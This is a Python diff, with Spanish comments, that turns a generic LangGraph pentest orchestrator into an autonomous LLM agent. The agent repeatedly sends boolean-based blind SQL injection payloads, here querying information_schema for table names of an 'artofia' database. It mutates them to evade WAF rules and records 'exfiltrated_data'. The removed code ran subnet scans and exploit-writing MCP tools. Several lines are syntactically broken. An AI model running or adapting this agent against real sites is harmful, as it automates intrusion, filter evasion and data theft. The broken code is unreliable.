@@ -1,232 +1,143 @@
-import json
 import os
+import json
 import asyncio
-import uuid
-from typing import TypedDict, List, Dict, Any, Literal
-from langgraph.graph import StateGraph, START, END
-from semantic_memory import SemanticMemory
+from typing import TypedDict, Annotated, List, Dict, Any
+from langgraph.graph import StateGraph, END
+from dual_llm_pattern import LocalDualLLM
+from mutators import SQLMutator
 
-# Simula la librería real: from langfuse.callback import CallbackHandler
-class MockLangfuseCallbackHandler:
-    """Mock de Langfuse para trazabilidad de grafos (OpenTelemetry compatible)."""
-    def __init__(self, public_key: str, secret_key: str, host: str):
-        self.public_key = public_key
-
+# Esquema de estado optimizado para Context Folding y Aislamiento
 class AgentState(TypedDict):
-    """Estado agnóstico diseñado para serialización constante."""
-    iteration_count: int
-    context_data: str
-    plan: List[Dict[str, Any]]
-    is_completed: bool
-    should_halt: bool
+    mission: str
+    target_url: str
+    current_payload: str
+    exfiltrated_data: str
+    iteration: int
+    status: str
+    # Mejora 3: Historial comprimido para evitar desbordamiento de RAM
+    failed_attempts_summary: List] 
+    last_response_metadata: Dict[str, Any]
+    waf_metadata: Dict[str, Any] # Solo JSON sanitizado, nunca logs crudos
 
-# ---------------------------------------------------------
-# NODOS DEL GRAFO (Topología)
-# ---------------------------------------------------------
-async def planner_node(state: AgentState) -> dict:
-    print("[PLANNER] Formulando estrategias abstractas y cargando contexto exterior.")
-    # Extraer nuevas tácticas basadas en el 'context_data' y empujar a 'plan'
-    return {"plan": state["plan"] + [{"action": "scan_network"}]}
+class ArtOfIAOrchestrator:
+    def __init__(self, target_url: str):
+        self.brain = LocalDualLLM(model="ollama/qwen3.5:9b")
+        self.mutator = SQLMutator()
+        self.target_url = target_url
+        self.progress_file = "progress.txt"
+        self.max_iterations = 15
 
-async def executor_node(state: AgentState) -> dict:
-    print("[EXECUTOR] Desenlazando acciones vía MCP (Herramientas predefinidas).")
-    from dual_llm_pattern import SymbolicController, QuarantineLLM, PrivilegedLLM
+    def _load_progress(self) -> str:
+        if os.path.exists(self.progress_file):
+            with open(self.progress_file, "r") as f:
+                return f.read().strip()
+        return ""
+
+    async def planner_node(self, state: AgentState):
+        """Nodo de Planificación - Ralph Loop con Context Folding."""
+        iteration = state.get("iteration", 0)
+        
+        # Mejora 3: Context Folding (Plegado de Historial) para proteger 16GB RAM
+        # Si superamos 5 intentos, consolidamos lo aprendido y purgamos basura 
+        history = state.get("failed_attempts_summary",)
+        if iteration > 5:
+            print("[*] Aplicando Context Folding: Resumiendo historial de ataques...")
+            summary_prompt = f"Resume estos fallos en 3 puntos tácticos: {history}"
+            # Se genera un resumen semántico para liberar memoria VRAM/RAM
+            history =
+
+        return {
+            "iteration": iteration + 1,
+            "exfiltrated_data": self._load_progress(),
+            "failed_attempts_summary": history,
+            "status": "calculating_next_move"
+        }
+
+    async def quarantine_node(self, state: AgentState):
+        """Mejora 2: Sanitización Estricta (Action-Selector Pattern)."""
+        # El PrivilegedLLM NUNCA lee el log crudo para evitar Prompt Injection 
+        raw_logs = self._read_latest_waf_logs()
+        
+        # El QuarantineLLM actúa como decodificador a JSON aséptico
+        sanitized_json = await self.brain.quarantine_parse(raw_logs)
+        
+        print(f"[*] Log sanitizado. Regla detectada: {sanitized_json.get('rule_id')}")
+        return {"waf_metadata": sanitized_json}
+
+    async def sniper_node(self, state: AgentState):
+        """Nodo Sniper - Toma decisiones basadas solo en metadatos sanitizados."""
+        # Se inyecta conocimiento experto dinámico desde la DB vectorial local
+        rule_id = state["waf_metadata"].get("rule_id", "generic")
+        tactic = await self.brain.get_expert_tactic(rule_id) 
+        
+        # El LLM elige la estrategia técnica de mutators.py
+        strategy = await self.brain.decide_strategy(state, tactic)
+        
+        mutated_payload = self.mutator.apply(state["current_payload"], strategy)
+        return {"current_payload": mutated_payload}
+
+    async def reflector_node(self, state: AgentState):
+        """Mejora 1: Validator Node Determinista (Judge Node)."""
+        # Ya no usamos un LLM para 'adivinar' si hackeamos. Usamos métricas reales .
+        response = await self._execute_request(state["current_payload"])
+        
+        # Lógica binaria determinista para Boolean-Based Blind SQLi [1]
+        # Comparamos si la respuesta contiene el indicador de 'True' vs 'False'
+        success_indicator = "Welcome back" # Ejemplo de cadena exitosa
+        is_successful = success_indicator in response.text
+        
+        if is_successful:
+            print(f"[+] ¡ÉXITO! Carácter validado determinísticamente.")
+            return {"status": "success", "last_response_metadata": {"length": len(response.text)}}
+        
+        # Si falla, registramos el intento para el Ralph Loop
+        return {
+            "status": "blocked" if response.status_code == 406 else "failed",
+            "failed_attempts_summary": state["failed_attempts_summary"] + [{"payload": state["current_payload"]}]
+        }
+
+    def build_graph(self):
+        workflow = StateGraph(AgentState)
+        
+        workflow.add_node("planner", self.planner_node)
+        workflow.add_node("quarantine", self.quarantine_node)
+        workflow.add_node("sniper", self.sniper_node)
+        workflow.add_node("reflector", self.reflector_node)
+
+        workflow.set_entry_point("planner")
+        workflow.add_edge("planner", "reflector")
+        
+        # Ruteo basado en el Validator Determinista
+        workflow.add_conditional_edges(
+            "reflector",
+            lambda x: "quarantine" if x["status"] in ["blocked", "failed"] else END,
+            {"quarantine": "quarantine", END: END}
+        )
+        
+        workflow.add_edge("quarantine", "sniper")
+        workflow.add_edge("sniper", "reflector")
+
+        return workflow.compile()
+
+# Implementación de ejecución asíncrona principal
+async def main():
+    orchestrator = ArtOfIAOrchestrator(target_url="http://target-waf/")
+    app = orchestrator.build_graph()
     
-    # MCP Client imports
-    from mcp import ClientSession
-    from mcp.client.sse import sse_client
+    print("=========================================================")
+    print(" ART OF IA v2.0 - ARCHITECTURE: REDAMON + DUAL-LLM ")
+    print("=========================================================")
     
-    controller = SymbolicController()
-    q_llm = QuarantineLLM(controller)
-    p_llm = PrivilegedLLM(controller)
-    temporal_exec = TemporalExecutor()
+    # El bot ahora es resiliente al reinicio y al agotamiento de RAM
+    state = {
+        "mission": "Listar tablas de la DB 'artofia'",
+        "current_payload": "1' AND (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='artofia' LIMIT 1),1,1)))=97--",
+        "iteration": 0,
+        "failed_attempts_summary":
+    }
     
-    safe_context = q_llm.parse_and_symbolize(state.get("context_data", ""))
-    if safe_context:
-        decision = p_llm.decide_action(safe_context)
-        action = decision.get("action", "")
-        raw_args = decision.get("mcp_arguments", {})
-        
-        final_args = {k: controller.resolve_payload(str(v)) for k, v in raw_args.items()}
-        try:
-            print(f"[EXECUTOR] Conectando a MCP Server (SSE)...")
-            async with sse_client("http://mcp-server:8000/sse") as (read, write):
-                async with ClientSession(read, write) as session:
-                    await session.initialize()
-                    
-                    print(f"[EXECUTOR] Llamando MCP Tool: {action} con {final_args}")
-                    # FastMCP tool names in main.py have underscores e.g. run_nmap
-                    mcp_tool_name = action if action.startswith("run_") or action in ["read_file", "write_exploit"] else f"run_{action}"
-                    
-                    res = await session.call_tool(mcp_tool_name, final_args)
-                    print(f"[EXECUTOR] Salida MCP:\n{res.content}")
-                    
-                    # El resultado desinfectado vuelve al contexto para la reflexión
-                    state["context_data"] += f"\n[OUTPUT {action}]: {str(res.content)}"
-                    
-        except Exception as e:
-            print(f"[EXECUTOR] Fallo en MCP o Conexión: {e}")
-            state["context_data"] += f"\n[ERROR {action}]: {str(e)}"
-            
-    return {"iteration_count": state.get("iteration_count", 0) + 1}
-
-async def reflector_node(state: AgentState) -> dict:
-    print("[REFLECTOR] Analizando viabilidad de la iteración. (L1-L4 Attribution).")
-    from mcp import ClientSession
-    from mcp.client.sse import sse_client
-    
-    # Criterio Empírico: ¿Existe proof.txt con la flag?
-    try:
-        async with sse_client("http://mcp-server:8000/sse") as (read, write):
-            async with ClientSession(read, write) as session:
-                await session.initialize()
-                res = await session.call_tool("read_file", {"path": "proof.txt"})
-                content = res.content[0].text if res.content else ""
-                
-                if "FLAG" in content.upper():
-                    print("[REFLECTOR] ✓ FLAG ENCONTRADA. Finalizando Ralph Loop.")
-                    return {"is_completed": True}
-    except Exception as e:
-        print(f"[REFLECTOR] No se pudo validar proof.txt (puede no existir aún): {e}")
-
-    # Lógica de detención tras suficientes iteraciones (Failsafe)
-    if state.get("iteration_count", 0) >= 10:
-        print("[REFLECTOR] ✗ Máximo de iteraciones alcanzado sin éxito.")
-        return {"is_completed": True, "should_halt": True}
-        
-    return {"is_completed": False}
-
-def route_next_step(state: AgentState) -> Literal["executor_node", "planner_node", "__end__"]:
-    if state.get("is_completed") or state.get("should_halt"):
-        return "__end__"
-    return "executor_node"
-
-# ---------------------------------------------------------
-# FILE PERSISTENCE MANAGER (Ralph Loop Dependency)
-# ---------------------------------------------------------
-class RalphStateManager:
-    """
-    Gestiona I/O de archivos físicos para externalizar el estado cognitivo.
-    Se asegura que el LLM arranque cada iteración siendo completamente Stateless.
-    """
-    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-    PLAN_FILE = os.path.join(BASE_DIR, "IMPLEMENTATION_PLAN.md")
-    PROGRESS_FILE = os.path.join(BASE_DIR, "progress.txt")
-
-    def initialize_if_missing(self, initial_state: AgentState):
-        if not os.path.exists(self.PROGRESS_FILE):
-            self.write_state(initial_state)
-
-    def load_state(self) -> AgentState:
-        """Hydration del estado leyendo disco duro puro."""
-        try:
-            with open(self.PROGRESS_FILE, 'r', encoding='utf-8') as f:
-                return json.load(f)
-        except (FileNotFoundError, json.JSONDecodeError):
-            return {"iteration_count": 0, "context_data": "", "plan": [], "is_completed": False, "should_halt": False}
-
-    def write_state(self, state: AgentState) -> None:
-        """Dehydration de estado para permitir la muerte del pipeline en memoria."""
-        with open(self.PROGRESS_FILE, 'w', encoding='utf-8') as f:
-            json.dump(state, f, indent=4)
-            
-        with open(self.PLAN_FILE, 'w', encoding='utf-8') as f:
-            f.write(f"# Estado de Ejecución Actual:\nIteraciones: {state.get('iteration_count')}\nPlan de Acción: {state.get('plan')}")
-
-# ---------------------------------------------------------
-# ORCHESTRATOR CLASS 
-# ---------------------------------------------------------
-class RalphLoopOrchestrator:
-    """
-    Controlador maestro del Workflow P-E-R.
-    Ejecuta un Bucle Infinito protegido (Ralph Loop) que asegura Cero-Memoria (Stateless context).
-    """
-    
-    def __init__(self):
-        self.state_manager = RalphStateManager()
-        self.graph = self._compile_graph()
-        
-        # Configuración asíncrona de trazabilidad Langfuse para Observabilidad
-        self.langfuse_handler = MockLangfuseCallbackHandler("pk_live_...", "sk_live_...", "https://cloud.langfuse.com")
-        self.semantic_memory = SemanticMemory()
-        
-    def _compile_graph(self):
-        builder = StateGraph(AgentState)
-        
-        # Inserción de los compontentes
-        builder.add_node("planner_node", planner_node)
-        builder.add_node("executor_node", executor_node)
-        builder.add_node("reflector_node", reflector_node)
-        
-        # Ralph Loop Flow P -> E -> R
-        builder.add_edge(START, "planner_node")
-        builder.add_edge("planner_node", "executor_node")
-        builder.add_edge("executor_node", "reflector_node")
-        builder.add_conditional_edges("reflector_node", route_next_step)
-        
-        return builder.compile()
-
-    async def execute_task(self, initial_directive: str):
-        print(f"\n=======================================================")
-        print(f" INICIANDO RALPH ORCHESTRATOR LOOP")
-        print(f"=======================================================\n")
-        
-        # 1. Base Initialization
-        self.state_manager.initialize_if_missing({
-            "iteration_count": 0,
-            "context_data": initial_directive,
-            "plan": [],
-            "is_completed": False,
-            "should_halt": False
-        })
-        
-        # 2. El clásico While True (Restaurando y matando contexto)
-        while True:
-            print("\n-------------------------------------------------------")
-            print(">>> [RALPH LOOP] Leyendo estado puro de filesystem...")
-            
-            # Carga limpia desde disco. No queda NINGUN rastro de iteraciones pasadas en memoria RAM/LLM.
-            current_state = self.state_manager.load_state()
-            
-            # Condición de quiebre (Escape del orquestador exterior)
-            if current_state.get("is_completed") or current_state.get("should_halt"):
-                print("\n[ORQUESTADOR] Tarea designada como COMPLETADA o ABORTADA. Cerrando Workflow.")
-                break
-                
-            # Configurar Telemetría (Langfuse) para este trazo específico
-            run_id = str(uuid.uuid4())
-            config = {
-                "configurable": {"thread_id": run_id},
-                "callbacks": [self.langfuse_handler] # <- Trazabilidad OTel/Langfuse
-            }
-            
-            print(f">>> [LANGGRAPH] Despertando flujo de trabajo [{run_id[:8]}...]")
-            try:
-                # 3. Invocar un ciclo en LangGraph. P -> E -> R -> BREAK
-                # Se utiliza `ainvoke` para resolver el DAG hasta que llegue a "__end__" 
-                # (o si usáramos `interrupt_before`, pararía). Aquí asume ejecución secuencial simple P->E->R->END
-                evolved_state = await self.graph.ainvoke(current_state, config=config)
-                
-                # 4. Inmediatamente externalizar al disco.
-                self.state_manager.write_state(evolved_state)
-                
-                # 5. Guardar en Memoria Semántica para persistencia a largo plazo (Fase 4)
-                print(">>> [RALPH LOOP] Indexando estado en memoria semántica...")
-                self.semantic_memory.add_memory(
-                    content=f"Iteración {evolved_state['iteration_count']}: {evolved_state['context_data']}",
-                    metadata={
-                        "run_id": run_id,
-                        "iteration": evolved_state['iteration_count'],
-                        "plan": evolved_state['plan']
-                    }
-                )
-                
-                print(">>> [RALPH LOOP] Estado consolidado a progreso.txt y DB. Memoria RAM destruída.\n")
-                
-            except Exception as e:
-                print(f"[ERROR CRÍTICO FATAL] La iteración del LangGraph falló: {e}")
-                break
+    async for output in app.astream(state):
+        pass # La persistencia se maneja internamente en los nodos
 
 if __name__ == "__main__":
-    orchestrator = RalphLoopOrchestrator()
-    asyncio.run(orchestrator.execute_task("Misión Crítica: Vulnerability Scanning Subnet 192.168.1.0/24"))
+    asyncio.run(main())
